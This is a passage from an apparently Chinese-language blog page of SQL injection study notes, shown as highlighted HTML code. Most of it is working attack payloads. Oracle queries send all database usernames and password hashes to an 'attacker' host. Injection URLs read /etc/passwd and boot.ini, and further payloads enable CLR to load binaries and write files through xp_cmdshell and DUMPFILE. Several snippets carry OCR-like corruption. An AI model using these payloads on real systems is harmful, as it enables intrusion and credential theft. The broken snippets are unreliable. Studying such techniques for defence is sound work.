punctuation\">(</span>sys_xmlgen<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>xmltype<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;?xml version=\"l.0\"?&gt; &lt;xsl:stylesheet version=\"1.0\" xmlns:xs1=\"http://www.w3.org/1999/XSL/Transform\"&gt;&lt;xsl:template match=\"/\"&gt;&lt;xsl:for-each select=\"/ROWSET/ USERNAME\"&gt;&lt;xsl:value-of select=\"text()\"/&gt;;&lt;/xsl:for-each&gt;&lt;/xsl:templatex/xsl:stylesheet&gt;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>getstringval<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> listagg <span class=\"token keyword\">from</span> all_users<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>'a<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#HTTPURITYPE</span>\n<span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>LENGTH<span class=\"token punctuation\">(</span>HTTPURITYPE<span class=\"token punctuation\">(</span><span class=\"token string\">'http://attacker/'</span><span class=\"token operator\">||</span>username<span class=\"token operator\">||</span><span class=\"token string\">'='</span><span class=\"token operator\">||</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>getclob <span class=\"token keyword\">FROM</span> sys<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span>$ <span class=\"token keyword\">WHERE</span> <span class=\"token keyword\">type</span><span class=\"token comment\">#=0 AND LENGTH(password)=16)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>Web服务器的访问日志文件将包含数据库的所有用户名和口令。</p>\n<p>注入ORDER BY子句</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> banner <span class=\"token keyword\">FROM</span> v$version <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> LENGTH<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> dba_users <span class=\"token keyword\">WHERE</span> UTL_HTTP<span class=\"token punctuation\">.</span>REQUEST<span class=\"token punctuation\">(</span><span class=\"token string\">'www.attacker.com/'</span><span class=\"token operator\">||</span>username<span class=\"token operator\">||</span><span class=\"token string\">'='</span><span class=\"token operator\">||</span>password<span class=\"token punctuation\">)</span> <span class=\"token operator\">IS</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"ICMP渗透\"><a href=\"#ICMP渗透\" class=\"headerlink\" title=\"ICMP渗透\"></a>ICMP渗透</h4><h3 id=\"自动SQL盲注利用\"><a href=\"#自动SQL盲注利用\" class=\"headerlink\" title=\"自动SQL盲注利用\"></a>自动SQL盲注利用</h3><h4 id=\"Absinthe\"><a href=\"#Absinthe\" class=\"headerlink\" title=\"Absinthe\"></a>Absinthe</h4><p>Absinthe的威力在于支持数据库映射，并且能利用基于错误和响应的推断利用来对很多流行的数据库（不管是商业的还是开源的）进行检索。方便的GUI为攻击者带来了很好的体验，但缺少特征签名支持限制了其效能。</p>\n<h4 id=\"BSQL-Hacker\"><a href=\"#BSQL-Hacker\" class=\"headerlink\" title=\"BSQL Hacker\"></a>BSQL Hacker</h4><p>BSQL Hacker是另一款图形化工具，它使用基于时间及响应的推断技术和标准错误来从所提问的数据库中提取数据。虽然它仍处于测试阶段，不是很稳定，但该工具前景很好且提供了很多欺诈机会。</p>\n<p><a href=\"https://labs.portcullis.co.uk/apologies-page-not-found/#aHR0cHM6Ly9sYWJzLnBvcnRjdWxsaXMuY28udWsvYXBwbGljYXRpb24vYnNhbC1oYWNrZXI=\">Apologies, page not found | Portcullis Labs</a></p>\n<h4 id=\"SQLBrute\"><a href=\"#SQLBrute\" class=\"headerlink\" title=\"SQLBrute\"></a>SQLBrute</h4><p>SQLBrute是一款命令行工具，它针对希望使用基于时间或响应的推断来利用某个固定漏洞的用户。</p>\n<h4 id=\"Sqlmap-1\"><a href=\"#Sqlmap-1\" class=\"headerlink\" title=\"Sqlmap\"></a>Sqlmap</h4><p>Sqlmap将漏洞的发现和利用结合在一款强大的工具中，它既支持基于时间的推断方法，也支持基于响应的推断方法，另外还支持ICMP通道方法。该工具的成长速度很快，开发也很活跃。</p>\n<h4 id=\"Sqlninja\"><a href=\"#Sqlninja\" class=\"headerlink\" title=\"Sqlninja\"></a>Sqlninja</h4><p>Sqlninja有很多特性，它支持使用基于DNS的非主流通道来执行远程命令。首先上传一个自定义的二进制封装器（wrapper），然后通过上传的封装器来执行命令。封装器捕获所有来自命令的输出并初始化一个DNS请求序列，请求中包含了编码后的输出。</p>\n<h4 id=\"Squeeza\"><a href=\"#Squeeza\" class=\"headerlink\" title=\"Squeeza\"></a>Squeeza</h4><p>Squeeza则从另一个视角审视SQL注入，它将数据创建与数据提取区分开来。该命令行工具可使用基于时间的推断、标准错误或DNS来提取时间。DNS通道完全借助T-SQL来执行，因而不需要上传二进制封装器。</p>\n<h2 id=\"利用操作系统\"><a href=\"#利用操作系统\" class=\"headerlink\" title=\"利用操作系统\"></a>利用操作系统</h2><p>访问文件系统以执行有效的任务（比如读取数据和上传文件）</p>\n<h3 id=\"访问文件系统\"><a href=\"#访问文件系统\" class=\"headerlink\" title=\"访问文件系统\"></a>访问文件系统</h3><h4 id=\"读文件\"><a href=\"#读文件\" class=\"headerlink\" title=\"读文件\"></a>读文件</h4><p>攻击者希望能够读取ASCII文本和二进制文件。</p>\n<h5 id=\"MySQL\"><a href=\"#MySQL\" class=\"headerlink\" title=\"MySQL\"></a>MySQL</h5><p>MySQL提供LOAD DATA INFILE和LOAD_FILE命令将文本文件读到数据库中。</p>\n<p>LOAD DATA INFILE语句以非常快的速度从文本文件中读取一行数据至表中。文件名必须是字符串字面值。</p>\n<p>用法</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#先创建一个文本test.txt，格式：</span>\n<span class=\"token comment\">#name school old</span>\n<span class=\"token comment\">#创建一张表来保存读取的信息</span>\n<span class=\"token keyword\">create</span> <span class=\"token keyword\">table</span> test<span class=\"token punctuation\">(</span>name <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>school <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>old <span class=\"token keyword\">char</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#读取并填充表</span>\n<span class=\"token keyword\">load</span> <span class=\"token keyword\">data</span> <span class=\"token keyword\">infile</span> <span class=\"token string\">'/xxx/test.txt'</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">table</span> test <span class=\"token keyword\">fields</span> <span class=\"token keyword\">terminated</span> <span class=\"token keyword\">by</span> <span class=\"token string\">''</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#读取成功</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>LOAD_FILE该函数不创建表可以直接传递结果</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'/xxx/test.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#注入回显文件的内容</span>\ndvwa<span class=\"token operator\">/</span>vulnerabilities<span class=\"token operator\">/</span>sqli<span class=\"token operator\">/</span>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,load_file('</span><span class=\"token operator\">/</span>etc<span class=\"token operator\">/</span>passwd'<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span><span class=\"token operator\">&amp;</span>Submit<span class=\"token operator\">=</span>Submit<span class=\"token comment\">#</span>\n<span class=\"token comment\">#通常etc/passwd换成16进制，以省略单引号</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#获取二进制文件</span>\n<span class=\"token string\">'union select NULL,HEX(LOAD_FILE('</span><span class=\"token operator\">/</span>tmp<span class=\"token operator\">/</span><span class=\"token keyword\">temp</span><span class=\"token punctuation\">.</span>ini'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>LOAD_FILE（）还接收UNC（通用命名约定）路径，攻击者可以在其他机器上搜索文件，甚至可以引导MySQL服务器连接到他们自己的机器</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'//172.16.125.2/temp_smb/test.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h5 id=\"Mssql\"><a href=\"#Mssql\" class=\"headerlink\" title=\"Mssql\"></a>Mssql</h5><p>攻击者（己经获取系统管理员权限）通常首先借用的是BULK INSERT语句。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">http:<span class=\"token comment\">//test.asp?sname=%</span>\n<span class=\"token comment\">#返回了所有用户，注入点</span>\n\n<span class=\"token comment\">#确定所运行的权限 sa</span>\nhttp:<span class=\"token comment\">//test.asp?sname='union select NULL,NULL,NULL,loginame FROM master..sysprocesses</span>\n<span class=\"token keyword\">WHERE</span> spid <span class=\"token operator\">=</span> @<span class=\"token variable\">@SPID</span><span class=\"token comment\">-- </span>\n\n<span class=\"token comment\">#执行读取命令</span>\nhttp:<span class=\"token comment\">//test.asp?sname='; create table hacked(line varchar(8000)); bulk insert hacked from 'c:\\boot.ini';-- </span>\n\n<span class=\"token comment\">#查看表就会看到已经插入</span>\nhttp:<span class=\"token comment\">//test.asp?sname='union select NULL,NULL,NULL,line from hacked-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>Squeeza工具，允许攻击者在后台临时表中执行批量插入，然后使用所选的通信机制（DNS、错误消息、时间）来提取信息，最后再在攻击者的机器上重建该文件。</p>\n<p>使用一个针对目标应用程序的squeeza.config文件来提取两个文件——远程服务器的 boot.ini 和二进制的 c:\\winnt\\system32\\net.exe</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token operator\">!</span>coрy \nc:<span class=\"token punctuation\">\\</span>boot.ini stolen-boot.ini \nc:<span class=\"token punctuation\">\\</span>winnt<span class=\"token punctuation\">\\</span>system32<span class=\"token punctuation\">\\</span>net.exe stolen-net.exe\n<span class=\"token operator\">!</span>quit<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>缺少批量插入方法</p>\n<p>使用(滥用)Scripting.FileSystemObject。</p>\n<p>引入了公共语言运行时(Microsoft Language Runtime，CLR)。它允许开发人员将.NET二进制文件轻而易举地集成到数据库中。</p>\n<p>通过向SQL Server导入程序集时所使用的方法来实现，SQL Server 2005默 认禁用了CLR集成。拥有系统管理员或与之等价的权限，以使用sp configure存储过程重新启用该功能</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">exec</span> sp_configure <span class=\"token string\">'show advanced options'</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">RECONFIGURE</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">exec</span> sp_configure <span class=\"token string\">'clr enabled'</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span>\n<span class=\"token keyword\">RECONFIGURE</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#使用CREATE ASSEMBLY函数从远程服务器加载任何.NET二进制文件至数据库中</span>\n<span class=\"token comment\">#使用下列注入字符串加载.NET程序集c:\\temp\\test.exe：</span>\nsname<span class=\"token operator\">=</span><span class=\"token string\">';create assembly sqb from '</span>c:\\<span class=\"token keyword\">temp</span>\\test<span class=\"token punctuation\">.</span>exe<span class=\"token string\">' with permission_set =unsafe-- \n\n#SQL Server在sys.assembly_files表中存储原始的二进制文件（作为HEX字符串）\n\nsname='</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>master<span class=\"token punctuation\">.</span>dbo<span class=\"token punctuation\">.</span>fn_varbintohexstr<span class=\"token punctuation\">(</span>substring<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> sys<span class=\"token punctuation\">.</span>assembly_files<span class=\"token comment\">-- </span>\n<span class=\"token comment\">#将二进制文件读取到web页面</span>\n\n<span class=\"token keyword\">create</span> assembly sqb <span class=\"token keyword\">from</span> <span class=\"token string\">'c:\\temp\\test.exe'</span>\n<span class=\"token comment\">#添加到原始库</span>\n<span class=\"token keyword\">alter</span> assembly sqb <span class=\"token keyword\">add</span> <span class=\"token keyword\">file</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'c:\\windows\\system32\\net.exe'</span>\n<span class=\"token keyword\">alter</span> assembly sqb <span class=\"token keyword\">add</span> <span class=\"token keyword\">file</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'c:\\temp\\test.txt'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"Oracle-5\"><a href=\"#Oracle-5\" class=\"headerlink\" title=\"Oracle\"></a>Oracle</h5><p> utl_file_dir/Oracle 目录、Java、Oracle Text三种接口访问文件</p>\n<p> utl_file_dir/Oracle 目录</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">utl_file<span class=\"token punctuation\">(</span>PL<span class=\"token operator\">/</span><span class=\"token keyword\">SQL</span><span class=\"token punctuation\">,</span> Oracle <span class=\"token number\">8</span> 至 <span class=\"token number\">11</span>g<span class=\"token punctuation\">)</span>\n\nDBMS_LOB<span class=\"token punctuation\">(</span>PL<span class=\"token operator\">/</span><span class=\"token keyword\">SQL</span><span class=\"token punctuation\">,</span> Oracle <span class=\"token number\">8</span> 至 <span class=\"token number\">11</span>g<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#从rds.txt文件读取了1000个字节(从第1个字节开始)，该文件位于MEDIA DIR目录中。</span>\n<span class=\"token keyword\">DECLARE</span>\nbuf varchar2<span class=\"token punctuation\">(</span><span class=\"token number\">4096</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nBEG <span class=\"token operator\">IN</span>\nLob_loc:<span class=\"token operator\">=</span> BFILENAME<span class=\"token punctuation\">(</span><span class=\"token string\">'MEDIA_DIR'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'rds.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nDBMS_LOB<span class=\"token punctuation\">.</span><span class=\"token keyword\">OPEN</span><span class=\"token punctuation\">(</span>Lob_loc<span class=\"token punctuation\">,</span> DBMS_LOB<span class=\"token punctuation\">.</span>LOB_READONLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nDBMS_LOB<span class=\"token punctuation\">.</span><span class=\"token keyword\">READ</span><span class=\"token punctuation\">(</span>Lob_loc<span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\ndbms_output<span class=\"token punctuation\">.</span>put_line<span class=\"token punctuation\">(</span>utl_raw<span class=\"token punctuation\">.</span>cast_to_varchar2<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nDBMS_LOB<span class=\"token punctuation\">.</span><span class=\"token keyword\">CLOSE</span><span class=\"token punctuation\">(</span>Lob_loc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">END</span><span class=\"token punctuation\">;</span>\n\n外部表<span class=\"token punctuation\">(</span>PL<span class=\"token operator\">/</span><span class=\"token keyword\">SQL</span><span class=\"token punctuation\">,</span> Oracle <span class=\"token number\">9</span>i R2 至 <span class=\"token number\">11</span>g<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">create</span> directory ext <span class=\"token keyword\">as</span> <span class=\"token string\">'C:\\';\nCREATE TABLE ext_tab(\nline varchar2(256))\nORGANIZATION EXTERNAL (TYPE oracle_loader\nDEFAULT DIRECTORY extACCESS PARAMETERS (\nRECORDS DELIMITED BY NEWLINE\nBADFILE '</span>bad_data<span class=\"token punctuation\">.</span>bad<span class=\"token string\">'\nLOGFILE '</span>log_data<span class=\"token punctuation\">.</span>log<span class=\"token string\">'\nFIELDS TERMINATED BY '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\nMISSING FIELD VALUES ARE NULL\nREJECT ROWS WITH ALL NULL FIELDS\n(line))\nLOCATION ('</span>victim<span class=\"token punctuation\">.</span>txt<span class=\"token string\">')\n)\nPARALLEL\nREJECT LIMIT 0\nNOMONITORING;\nSelect * from ext_tab;\n\n'</span>\nXMLType<span class=\"token punctuation\">(</span>PL<span class=\"token operator\">/</span><span class=\"token keyword\">SQL</span><span class=\"token punctuation\">,</span> Oracle <span class=\"token number\">9</span>i R2 至 <span class=\"token number\">11</span>g<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#从data-source.xml文件中读取用户名、明文口令和连接字符串</span>\n<span class=\"token keyword\">select</span> extractvalue<span class=\"token punctuation\">(</span><span class=\"token keyword\">value</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'/connection-factory/@user'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span><span class=\"token string\">'/'</span><span class=\"token operator\">||</span>extractvalue<span class=\"token punctuation\">(</span><span class=\"token keyword\">value</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'/connection-factory/@password'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span><span class=\"token string\">'@'</span><span class=\"token operator\">||</span>substr<span class=\"token punctuation\">(</span>extractvalue<span class=\"token punctuation\">(</span><span class=\"token keyword\">value</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'/connection-factory/@url'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>instr<span class=\"token punctuation\">(</span>extractvalue<span class=\"token punctuation\">(</span><span class=\"token keyword\">value</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'/connection-factory/@url'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'//'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> conn <span class=\"token keyword\">FROM</span> <span class=\"token keyword\">table</span><span class=\"token punctuation\">(</span>XMLSequence<span class=\"token punctuation\">(</span>extract<span class=\"token punctuation\">(</span>xmltype<span class=\"token punctuation\">(</span>bfilename<span class=\"token punctuation\">(</span><span class=\"token string\">'GETPWDIR'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'datasources.xml'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>nls_charset_id<span class=\"token punctuation\">(</span><span class=\"token string\">'WE8ISO8859P1'</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">'/data-sources/connection-pool/connection-factory'</span>\n<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">)</span>c\n<span class=\"token operator\">/</span>\n\n<span class=\"token comment\">#Oracle Text是一种很少有人知道的读取文件和URInate的技术。它不需要Java或utl_file_dir/Oracle目录，只需将想读取的文件或URL插入到一张表中并创建一个全文索引或者一直等待全文索引创建成功即可。该索引了包含整个文件的内容。</span>\n<span class=\"token comment\">#下列示例代码说明了如何通过将boot.ini插入到一张表中来读取该文件</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> files <span class=\"token punctuation\">(</span>id NUMBER <span class=\"token keyword\">PRIMARY</span> <span class=\"token keyword\">KEY</span><span class=\"token punctuation\">,</span>\npath <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">UNIQUE</span><span class=\"token punctuation\">;</span>ot_format <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> files <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'c:\\boot.ini'</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">INDEX</span> file_index <span class=\"token keyword\">ON</span> files<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span> INDEXTYPE <span class=\"token operator\">IS</span> ctxsys<span class=\"token punctuation\">.</span>contextPARAMETERS<span class=\"token punctuation\">(</span><span class=\"token string\">'datastore ctxsys.file_datastore format column ot_format'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- retrieve data from the fulltext index</span>\n<span class=\"token keyword\">Select</span> token_text <span class=\"token keyword\">from</span> dr$file_index$i<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"PostgreSQL-3\"><a href=\"#PostgreSQL-3\" class=\"headerlink\" title=\"PostgreSQL\"></a>PostgreSQL</h5><p>PostgreSQL提供了内置的COPY功能，可以将文本文件复制到表中的text字段，使用COPY 功能复制文件时，该文本文件应该是完全可读的(world readable),或者运行PostgreSQL进程的用户(通常是postgres用户)应该是该文件的所有者。</p>\n<p>下面的例子演示了攻击者如何读取 ‘etc/passwd’文件的内容：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#创建一个临时表</span>\nhttp:<span class=\"token comment\">//10.10.10.114/test.php?id=1;CREATE table temp (name text);-- </span>\n\n<span class=\"token comment\">#将文件复制到表中</span>\nhttp:<span class=\"token comment\">//10.10.10.114/test.php?id=1;copy temp from '/etc/passwd'-- </span>\n\n<span class=\"token comment\">#读取表。在将文件复制到表中之后，就可以使用SQL注入技术来读取该表，比如使用 union技术或盲注技术</span>\nhttp:<span class=\"token comment\">//10.10.10.114/test.php?id=l union select 2,name from temp-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"写文件\"><a href=\"#写文件\" class=\"headerlink\" title=\"写文件\"></a>写文件</h4><h5 id=\"MySQL-1\"><a href=\"#MySQL-1\" class=\"headerlink\" title=\"MySQL\"></a>MySQL</h5><p>select into outfile（dumpfile）该命令可以将一条select语句的结果写到MySQL进程所有者拥有的完全可读的文件中（dumpfile允许写二进制文件）</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token string\">'test'</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span> <span class=\"token string\">'/tmp/test.txt'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#使用下列搜索字符串：</span>\naaa <span class=\"token string\">'union select NULL,'</span>SensePost <span class=\"token number\">2008</span>\\n<span class=\"token string\">' into dumpfile '</span><span class=\"token operator\">/</span>tmp<span class=\"token operator\">/</span>sp<span class=\"token punctuation\">.</span>txt' <span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>使用的是dumpfile(允许输出二进制文件)而非 outfile，这样一来，要想正常结束一行，就必须提供\\n</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> UNHEX<span class=\"token punctuation\">(</span><span class=\"token string\">'53656E7365506F7374203038'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#unhex()和hex()相反</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h5 id=\"Mssql-1\"><a href=\"#Mssql-1\" class=\"headerlink\" title=\"Mssql\"></a>Mssql</h5><p>读取文件的scripting.filesystem对象方法来有效地向文件系统写文件，也可以使用该技术来写二进制文件，某些代码页面使用该技术的话会出现错误，对于这种情况，可以使用其他对象而非filesystem对象，比如ADODB.Stream。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#批量复制程序BCP</span>\nC:\\<span class=\"token keyword\">temp</span><span class=\"token operator\">&gt;</span>bcp <span class=\"token string\">\"select name from sysobjects\"</span> queryout testout<span class=\"token punctuation\">.</span>txt <span class=\"token operator\">-</span>c <span class=\"token operator\">-</span>S <span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span> <span class=\"token operator\">-</span>U sa <span class=\"token operator\">-</span>P<span class=\"token string\">\"\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#使用重定向运算符&gt;&gt;创建文本文件：</span>\n<span class=\"token keyword\">exec</span> xp_cmdshell <span class=\"token string\">'echo This\tis a test &gt;c:\\temp\\test.txt'</span>\n<span class=\"token keyword\">exec</span> xp_cmdshell <span class=\"token string\">'echo This\tis line\t2 &gt;&gt;c:\\temp\\test.txt'</span>\n<span class=\"token keyword\">exec</span> xp_cmdshell <span class=\"token string\">'echo This\tis line\t3\n&gt;&gt;c:\\temp\\test.txt'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#先创建一个debug.exe脚本文件，然后将它传递给debug.exe以转换成一个二进制文件。</span>\nC:\\<span class=\"token keyword\">temp</span><span class=\"token operator\">&gt;</span>debug <span class=\"token operator\">&lt;</span> demo<span class=\"token punctuation\">.</span>scr\n<span class=\"token operator\">-</span>n demo<span class=\"token punctuation\">.</span>com\n<span class=\"token operator\">-</span>e <span class=\"token number\">0000</span> <span class=\"token number\">4</span>D <span class=\"token number\">5</span>A <span class=\"token number\">90</span> <span class=\"token number\">00</span> <span class=\"token number\">03</span> <span 